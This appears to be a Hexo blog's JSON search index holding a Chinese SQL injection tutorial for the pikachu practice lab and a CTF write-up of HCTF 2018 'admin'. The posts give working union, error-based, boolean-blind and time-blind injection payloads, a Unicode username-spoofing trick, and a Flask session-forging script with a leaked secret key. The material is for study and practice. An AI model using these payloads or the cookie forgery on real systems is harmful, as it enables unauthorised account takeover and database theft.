[{"title":"Hello World","url":"/2021/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","categories":["World"],"tags":["Hello"]},{"title":"SQL-SQL注入基础","url":"/2021/SQL-SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/","content":"SQL-SQL注入基础SQL注入即开发者对用户输入参数没有做到严格过滤，导致用户输入数据能够影响预设的查询功能\n通常表现为数据库原有信息被泄露、篡改，甚至删除\nUNION注入-数字型注入前提：用户通过传入的id等参数，可以从数据库中查询相应的记录\n对字符型注入的判断：判断输入值有无数字运算的特征行为\n例如：输入id=2与id=3-1得到的反馈是相同的，即该注入点为数字型注入\n以pikachu漏洞练习平台上题目为例\nSQL-Inject/数字型注入（post）\n使用BURPSUITE修改post请求\nid=3\n\nid=5-2\n\n可见id值为“3”与id值为“5-2”所得反馈相同\n即该注入点为数字型注入\n使用UNION并入SQL查询语句来干扰正常查询\n在确定为数字型注入后，使用order by 1-99语句查询该数据表的字段数量\nid=1 order by 2\n\n返回界面与id=1时相同\nid=1 order by 3\n\n出现了错误\n即在该环境中，通过order by查询得到的字段数为2\n故union注入的语句如下：\nunion select 1,2\n\n访问id=1 union select 1,2\n\n既执行了id=1的查询，也执行了union后的查询\n指定id=-1或一个很大的值，使其无法正常执行原查询，则会执行union后的查询\n将union select 1,2中的1或2修改成需要的查询语句\n例如：\nid=-1 union select 1,database()或id=-1 union select database(),2\n\ndatabase()函数用于查询当前数据库名，即可得到该数据库名为“pikachu“\n\n之后可通过修改查询语句进行对数据库的查询\n查询表名\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27;\n\n这里只显示第一项记录\n\n在原有数据后面加上”limit 1,1“参数即可显示第二条记录\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 1,1\n\n”limit 1,1“即为条件限定，取查询结果第一条记录的后一条记录\n\n同理”limit 2,1“为限定查询结果第二条记录的后一条记录\n同理”limit 0,100“为限定查询结果的前一百条记录\nid=-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,100\n\n\n亦可使用”group_concat“来用”,“联合多行记录\nid=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #查询所有表名或id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27; #查询“pikachu”库下所有表名\n\n\n继续查询所需要的\nid=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;member&#x27;id=-1 union select username,email from member\n\n最后查询对应的”username“与”email“即可\n\nUNION注入-字符型注入GET参数输入的地方包裹单引号，变成字符串\n注入方式：尝试闭合前面单引号，且注释后面的语句\n即：使用单引号闭合前面单引号，使用注释符号注释后面语句\n常用注释：”#“、”/**/“\n构造时应使用符号的url编码\n空格：”%20“，”#“：”%23“，”‘“：”%27“\nurl中构造\nkobe%27union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23\n\n结果如下：\n\n修改union后面的查询语句即可继续查询所需的内容\n报错注入利用页面报错信息获取数据\n常用于报错注入的函数：\n\nupdatexml()： MySQL对XML文档数据进行查询和修改的XPATH函数\nextractvalue()：MySQL对XML文档数据进行查询的XPATH函数\nfloor()：MySQL中用来取整的函数\n\nUPDATEXML (XML_document, XPath_string, new_value);\n\n第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程\n第三个参数：new_value，String格式，替换查找到的符合条件的数据\n作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值\n\n测试题：pikachu漏洞练习平台/数字型注入(post)\n通过报错信息查询数据库名称\nid=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)\n\n\n将database()函数替换为其他查询语句即可\n布尔盲注通过注入得到的真假回显推测出数据\n测试环境：pikachu漏洞练习平台\n添加”and“，”and“两边需同时满足查询才可执行\n测试题：pikachu漏洞练习平台/数字型注入(post)\n判断数据库名的长度\nid=1 and length(database())&gt;=7\n\n执行成功\nid=1 and length(database())&gt;=8\n\n不能执行\n上文可知该数据库名为”pikachu“，为7位字符\n判断数据库的名称\nid=1 and substr(database(),1,1)&gt;&#x27;a&#x27;\n\n执行成功\nsubstr()函数功能为截取，“1,1”即截取database()中从第一个开始字符，返回一个字符，这点与limit不同\n即可使用二分法去猜测字符\nid=1 and substr(database(),1,1)&gt;&#x27;p&#x27;\n\n执行成功\nMySQL自带的截取函数：substring(),mid(),substr()\n将database()函数换成其他查询语句，即可查询所需\n如若改变测试题为：pikachu漏洞练习平台/字符型注入(get)\nget型要注意url编码,而字符型需要构造闭合，且需要注释，故构造如下\nkobe%27%20and%20length(database())&gt;1%23\n\n执行成功\n其他具体查询就与前文类似\n在数字型与字符型分别访问以下两个\nid= 1 or 1=1kobe%27%20or%201=1%23\n\n由于1=1是永真条件，页面定能执行，返回出来的东西还会有惊喜\n时间盲注某些情况下页面回显内容是完全一致的，可通过增加语句执行时需要等待的时间来判断查询是否为有效查询\n测试题：pikachu漏洞练习平台/字符型注入(get)\n访问\nkobe&#x27; and sleep(3)#\n\n后台等待三秒才开始执行\n\n判断数据库名\nkobe&#x27; and if((substr(database(), 1, 1))=&#x27;p&#x27;, sleep(3), null)#\n\n延迟了三秒，证明查询成功，数据库名第一个字母为“p”\n可通过这种特性，查询所需内容，具体与布尔盲注类似\n总结注入技巧使用优先级是：UNION注入&gt;报错注入&gt;布尔盲注&gt;时间盲注\n","categories":["CTF-WEB"],"tags":["SQL"]},{"title":"BUUCTF-[HCTF 2018]admin","url":"/2021/BUUCTF-%5BHCTF%202018%5Dadmin/","content":"[HCTF 2018]admin进入界面：\n没注册的时候有”login”,”register”两个选项\n\n随随便便就给它注册一个\n诶，这回选择就多了\n可以”index”,”post”,”change password”,”logout”\n\n几次尝试：由提示”admin”入手提示为admin\n那我就乖乖地注册一个admin账户\n哦吼，我滴乖乖\n已经被注册了\n\n那说明什么，这个admin账户指定有点东西\n首先想到的是使用BURPSUITE进行密码爆破\n很显然，似乎是不能爆破，具体原因我不清楚，待大佬指点，记一坑，日后填\n依然由”admin”开始操作，改变大小写注册”Admin”账户假装我是”admin”，以失败告终\n正确姿势进行修改密码时，查看网页源代码\n可以发现提供题目源码的地址\nhttps:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F;\n\n源码如下：\n  1 #!&#x2F;usr&#x2F;bin&#x2F;env python  2 # -*- coding:utf-8 -*-  3   4 from flask import Flask, render_template, url_for, flash, request, redirect, session, make_response  5 from flask_login import logout_user, LoginManager, current_user, login_user  6 from app import app, db  7 from config import Config  8 from app.models import User  9 from forms import RegisterForm, LoginForm, NewpasswordForm 10 from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep 11 from io import BytesIO 12 from code import get_verify_code 13  14 @app.route(&#39;&#x2F;code&#39;) 15 def get_code(): 16     image, code &#x3D; get_verify_code() 17     # 图片以二进制形式写入 18     buf &#x3D; BytesIO() 19     image.save(buf, &#39;jpeg&#39;) 20     buf_str &#x3D; buf.getvalue() 21     # 把buf_str作为response返回前端，并设置首部字段 22     response &#x3D; make_response(buf_str) 23     response.headers[&#39;Content-Type&#39;] &#x3D; &#39;image&#x2F;gif&#39; 24     # 将验证码字符串储存在session中 25     session[&#39;image&#39;] &#x3D; code 26     return response 27  28 @app.route(&#39;&#x2F;&#39;) 29 @app.route(&#39;&#x2F;index&#39;) 30 def index(): 31     return render_template(&#39;index.html&#39;, title &#x3D; &#39;hctf&#39;) 32  33 @app.route(&#39;&#x2F;register&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;]) 34 def register(): 35  36     if current_user.is_authenticated: 37         return redirect(url_for(&#39;index&#39;)) 38  39     form &#x3D; RegisterForm() 40     if request.method &#x3D;&#x3D; &#39;POST&#39;: 41         name &#x3D; strlower(form.username.data) 42         if session.get(&#39;image&#39;).lower() !&#x3D; form.verify_code.data.lower(): 43             flash(&#39;Wrong verify code.&#39;) 44             return render_template(&#39;register.html&#39;, title &#x3D; &#39;register&#39;, form&#x3D;form) 45         if User.query.filter_by(username &#x3D; name).first(): 46             flash(&#39;The username has been registered&#39;) 47             return redirect(url_for(&#39;register&#39;)) 48         user &#x3D; User(username&#x3D;name) 49         user.set_password(form.password.data) 50         db.session.add(user) 51         db.session.commit() 52         flash(&#39;register successful&#39;) 53         return redirect(url_for(&#39;login&#39;)) 54     return render_template(&#39;register.html&#39;, title &#x3D; &#39;register&#39;, form &#x3D; form) 55  56 @app.route(&#39;&#x2F;login&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;]) 57 def login(): 58     if current_user.is_authenticated: 59         return redirect(url_for(&#39;index&#39;)) 60  61     form &#x3D; LoginForm() 62     if request.method &#x3D;&#x3D; &#39;POST&#39;: 63         name &#x3D; strlower(form.username.data) 64         session[&#39;name&#39;] &#x3D; name 65         user &#x3D; User.query.filter_by(username&#x3D;name).first() 66         if user is None or not user.check_password(form.password.data): 67             flash(&#39;Invalid username or password&#39;) 68             return redirect(url_for(&#39;login&#39;)) 69         login_user(user, remember&#x3D;form.remember_me.data) 70         return redirect(url_for(&#39;index&#39;)) 71     return render_template(&#39;login.html&#39;, title &#x3D; &#39;login&#39;, form &#x3D; form) 72  73 @app.route(&#39;&#x2F;logout&#39;) 74 def logout(): 75     logout_user() 76     return redirect(&#39;&#x2F;index&#39;) 77  78 @app.route(&#39;&#x2F;change&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;]) 79 def change(): 80     if not current_user.is_authenticated: 81         return redirect(url_for(&#39;login&#39;)) 82     form &#x3D; NewpasswordForm() 83     if request.method &#x3D;&#x3D; &#39;POST&#39;: 84         name &#x3D; strlower(session[&#39;name&#39;]) 85         user &#x3D; User.query.filter_by(username&#x3D;name).first() 86         user.set_password(form.newpassword.data) 87         db.session.commit() 88         flash(&#39;change successful&#39;) 89         return redirect(url_for(&#39;index&#39;)) 90     return render_template(&#39;change.html&#39;, title &#x3D; &#39;change&#39;, form &#x3D; form) 91  92 @app.route(&#39;&#x2F;edit&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;]) 93 def edit(): 94     if request.method &#x3D;&#x3D; &#39;POST&#39;: 95          96         flash(&#39;post successful&#39;) 97         return redirect(url_for(&#39;index&#39;)) 98     return render_template(&#39;edit.html&#39;, title &#x3D; &#39;edit&#39;) 99 100 @app.errorhandler(404)101 def page_not_found(error):102     title &#x3D; unicode(error)103     message &#x3D; error.description104     return render_template(&#39;errors.html&#39;, title&#x3D;title, message&#x3D;message)105 106 def strlower(username):107     username &#x3D; nodeprep.prepare(username)108     return username\n\nUnicode欺骗观察源码\n在末尾定义了一个函数 strlower() \n1 def strlower(username):2     username &#x3D; nodeprep.prepare(username)3     return username\n\n这个函数在注册、登录、修改密码中都存在\n\n函数主体中 username = nodeprep.prepare(username) \n观察源码第十行 from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep \nnodeprep是从Twisted模块导入\n打开项目的requirements.txt\n 1 Flask&#x3D;&#x3D;0.10.1 2 Werkzeug&#x3D;&#x3D;0.10.4 3 Flask_Login&#x3D;&#x3D;0.4.1 4 Twisted&#x3D;&#x3D;10.2.0 5 Flask_SQLAlchemy&#x3D;&#x3D;2.0 6 WTForms&#x3D;&#x3D;2.2.1 7 Flask_Migrate&#x3D;&#x3D;2.2.1 8 Flask_WTF&#x3D;&#x3D;0.14.2 9 Pillow&#x3D;&#x3D;5.3.010 pymysql&#x3D;&#x3D;0.9.2\n\n其中 Twisted==10.2.0 \n与官网的版本相比较，已是非常古老\n\n利用古老版本的漏洞来作为这一题的突破口\n而这里面就存在Unicode编码的一个问题\n可以知道当使用了nodeprep.prepare()函数之后，如果我们先使用unicode的编码的字符，比如说 ᴬ ，使用该函数之后，他会先变成大写的A，再使用一次就会变成小写的a\n具体字符可查这\n\n下面是我自己使用python尝试了一下项目中的编译\n其中Unicode编码 \\u1d2c\\u1d30\\u1d39\\u1d35\\u1d3a 为”ᴬᴰᴹᴵᴺ”的unicode编码\n\n报错为 raise UnicodeError(“Unassigned code point %s” % repr(c)) 具体问题排查中\n注册”ᴬᴰᴹᴵᴺ”账号\n\n登录进去，猛如虎一顿操作，改一个我的小脑袋瓜子能够记得住的密码\n\n退出该账号\n通过”admin”进行登录\n输入”ᴬᴰᴹᴵᴺ”账号的密码即可进入\n悄咪咪地溜进去悄咪咪地拿到flag最后悄咪咪地走人\n\nSession伪造以下是来自学长的指点：\n\n服务器端是通过seesion区分用户的 \n如果你解密你的seesion\n然后添加管理员权限的标记 \n再加密回去 \n服务器就会认为你是admin\n\n这题的session是存在于本地\n由资料中的文章知flask的session是存在客户端\n随便注册一个账号”beacon”\n登录进去，拿到session\n\n通过以下代码进行解码：\n 1 #!&#x2F;usr&#x2F;bin&#x2F;env python3 2 import sys 3 import zlib 4 from base64 import b64decode 5 from flask.sessions import session_json_serializer 6 from itsdangerous import base64_decode 7  8 def decryption(payload): 9     payload, sig &#x3D; payload.rsplit(b&#39;.&#39;, 1)10     payload, timestamp &#x3D; payload.rsplit(b&#39;.&#39;, 1)11 12     decompress &#x3D; False13     if payload.startswith(b&#39;.&#39;):14         payload &#x3D; payload[1:]15         decompress &#x3D; True16 17     try:18         payload &#x3D; base64_decode(payload)19     except Exception as e:20         raise Exception(&#39;Could not base64 decode the payload because of an exception&#39;)21 22     if decompress:23         try:24             payload &#x3D; zlib.decompress(payload)25         except Exception as e:26             raise Exception(&#39;Could not zlib decompress the payload before decoding the payload&#39;)27 28     return session_json_serializer.loads(payload)29 30 if __name__ &#x3D;&#x3D; &#39;__main__&#39;:31     print(decryption(str(input(&quot;输入需要解码的Session:&quot;)).encode() ))\n\n解码情况如下：\n\n解码完成之后就是伪造session\n伪造session需要SECRET_KEY\n在项目文件中可以找到\n1 import os2 3 class Config(object):4     SECRET_KEY &#x3D; os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;5     SQLALCHEMY_DATABASE_URI &#x3D; &#39;mysql+pymysql:&#x2F;&#x2F;root:adsl1234@db:3306&#x2F;test&#39;6     SQLALCHEMY_TRACK_MODIFICATIONS &#x3D; True\n\nSECRET_KEY为”ckj123&quot;\n“name”由”beacon”修改为”admin”\n进行session加密\n加密代码如下（取自GitHub）\n  1 #!&#x2F;usr&#x2F;bin&#x2F;env python3  2 &quot;&quot;&quot; Flask Session Cookie Decoder&#x2F;Encoder &quot;&quot;&quot;  3 __author__ &#x3D; &#39;Wilson Sumanang, Alexandre ZANNI&#39;  4   5 # standard imports  6 import sys  7 import zlib  8 from itsdangerous import base64_decode  9 import ast 10  11 # Abstract Base Classes (PEP 3119) 12 if sys.version_info[0] &lt; 3: # &lt; 3.0 13     raise Exception(&#39;Must be using at least Python 3&#39;) 14 elif sys.version_info[0] &#x3D;&#x3D; 3 and sys.version_info[1] &lt; 4: # &gt;&#x3D; 3.0 &amp;&amp; &lt; 3.4 15     from abc import ABCMeta, abstractmethod 16 else: # &gt; 3.4 17     from abc import ABC, abstractmethod 18  19 # Lib for argument parsing 20 import argparse 21  22 # external Imports 23 from flask.sessions import SecureCookieSessionInterface 24  25 class MockApp(object): 26  27     def __init__(self, secret_key): 28         self.secret_key &#x3D; secret_key 29  30  31 if sys.version_info[0] &#x3D;&#x3D; 3 and sys.version_info[1] &lt; 4: # &gt;&#x3D; 3.0 &amp;&amp; &lt; 3.4 32     class FSCM(metaclass&#x3D;ABCMeta): 33         def encode(secret_key, session_cookie_structure): 34             &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot; 35             try: 36                 app &#x3D; MockApp(secret_key) 37  38                 session_cookie_structure &#x3D; dict(ast.literal_eval(session_cookie_structure)) 39                 si &#x3D; SecureCookieSessionInterface() 40                 s &#x3D; si.get_signing_serializer(app) 41  42                 return s.dumps(session_cookie_structure) 43             except Exception as e: 44                 return &quot;[Encoding error] &#123;&#125;&quot;.format(e) 45                 raise e 46  47  48         def decode(session_cookie_value, secret_key&#x3D;None): 49             &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot; 50             try: 51                 if(secret_key&#x3D;&#x3D;None): 52                     compressed &#x3D; False 53                     payload &#x3D; session_cookie_value 54  55                     if payload.startswith(&#39;.&#39;): 56                         compressed &#x3D; True 57                         payload &#x3D; payload[1:] 58  59                     data &#x3D; payload.split(&quot;.&quot;)[0] 60  61                     data &#x3D; base64_decode(data) 62                     if compressed: 63                         data &#x3D; zlib.decompress(data) 64  65                     return data 66                 else: 67                     app &#x3D; MockApp(secret_key) 68  69                     si &#x3D; SecureCookieSessionInterface() 70                     s &#x3D; si.get_signing_serializer(app) 71  72                     return s.loads(session_cookie_value) 73             except Exception as e: 74                 return &quot;[Decoding error] &#123;&#125;&quot;.format(e) 75                 raise e 76 else: # &gt; 3.4 77     class FSCM(ABC): 78         def encode(secret_key, session_cookie_structure): 79             &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot; 80             try: 81                 app &#x3D; MockApp(secret_key) 82  83                 session_cookie_structure &#x3D; dict(ast.literal_eval(session_cookie_structure)) 84                 si &#x3D; SecureCookieSessionInterface() 85                 s &#x3D; si.get_signing_serializer(app) 86  87                 return s.dumps(session_cookie_structure) 88             except Exception as e: 89                 return &quot;[Encoding error] &#123;&#125;&quot;.format(e) 90                 raise e 91  92  93         def decode(session_cookie_value, secret_key&#x3D;None): 94             &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot; 95             try: 96                 if(secret_key&#x3D;&#x3D;None): 97                     compressed &#x3D; False 98                     payload &#x3D; session_cookie_value 99 100                     if payload.startswith(&#39;.&#39;):101                         compressed &#x3D; True102                         payload &#x3D; payload[1:]103 104                     data &#x3D; payload.split(&quot;.&quot;)[0]105 106                     data &#x3D; base64_decode(data)107                     if compressed:108                         data &#x3D; zlib.decompress(data)109 110                     return data111                 else:112                     app &#x3D; MockApp(secret_key)113 114                     si &#x3D; SecureCookieSessionInterface()115                     s &#x3D; si.get_signing_serializer(app)116 117                     return s.loads(session_cookie_value)118             except Exception as e:119                 return &quot;[Decoding error] &#123;&#125;&quot;.format(e)120                 raise e121 122 123 if __name__ &#x3D;&#x3D; &quot;__main__&quot;:124     # Args are only relevant for __main__ usage125     126     ## Description for help127     parser &#x3D; argparse.ArgumentParser(128                 description&#x3D;&#39;Flask Session Cookie Decoder&#x2F;Encoder&#39;,129                 epilog&#x3D;&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)130 131     ## prepare sub commands132     subparsers &#x3D; parser.add_subparsers(help&#x3D;&#39;sub-command help&#39;, dest&#x3D;&#39;subcommand&#39;)133 134     ## create the parser for the encode command135     parser_encode &#x3D; subparsers.add_parser(&#39;encode&#39;, help&#x3D;&#39;encode&#39;)136     parser_encode.add_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar&#x3D;&#39;&lt;string&gt;&#39;,137                                 help&#x3D;&#39;Secret key&#39;, required&#x3D;True)138     parser_encode.add_argument(&#39;-t&#39;, &#39;--cookie-structure&#39;, metavar&#x3D;&#39;&lt;string&gt;&#39;,139                                 help&#x3D;&#39;Session cookie structure&#39;, required&#x3D;True)140 141     ## create the parser for the decode command142     parser_decode &#x3D; subparsers.add_parser(&#39;decode&#39;, help&#x3D;&#39;decode&#39;)143     parser_decode.add_argument(&#39;-s&#39;, &#39;--secret-key&#39;, metavar&#x3D;&#39;&lt;string&gt;&#39;,144                                 help&#x3D;&#39;Secret key&#39;, required&#x3D;False)145     parser_decode.add_argument(&#39;-c&#39;, &#39;--cookie-value&#39;, metavar&#x3D;&#39;&lt;string&gt;&#39;,146                                 help&#x3D;&#39;Session cookie value&#39;, required&#x3D;True)147 148     ## get args149     args &#x3D; parser.parse_args()150 151     ## find the option chosen152     if(args.subcommand &#x3D;&#x3D; &#39;encode&#39;):153         if(args.secret_key is not None and args.cookie_structure is not None):154             print(FSCM.encode(args.secret_key, args.cookie_structure))155     elif(args.subcommand &#x3D;&#x3D; &#39;decode&#39;):156         if(args.secret_key is not None and args.cookie_value is not None):157             print(FSCM.decode(args.cookie_value,args.secret_key))158         elif(args.cookie_value is not None):159             print(FSCM.decode(args.cookie_value))\n\n执行\npython .\\flask_session_cookie_manager.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;3fbbbd4cf0447592eac22fe47104c884df13b3eb75f93a47a15ca80c53c2de846e6606703cb8d1e9bd9ec0f9f124d9edcfc909583cfc8c42fe7eaeca159441ab&#39;, &#39;csrf_token&#39;: b&#39;ade7afede008694bd78e9ab33291242fb3d9d3d4&#39;, &#39;image&#39;: b&#39;6xVv&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot;\n\n将原session修改成伪造后的session值即可\n\n资料网上一题三解：三种本题解法\nUnicode查询：Unicode character table\nSession相关：session\nSession加密：Session加密\n","categories":["CTF-WEB"],"tags":["练习记录"]}]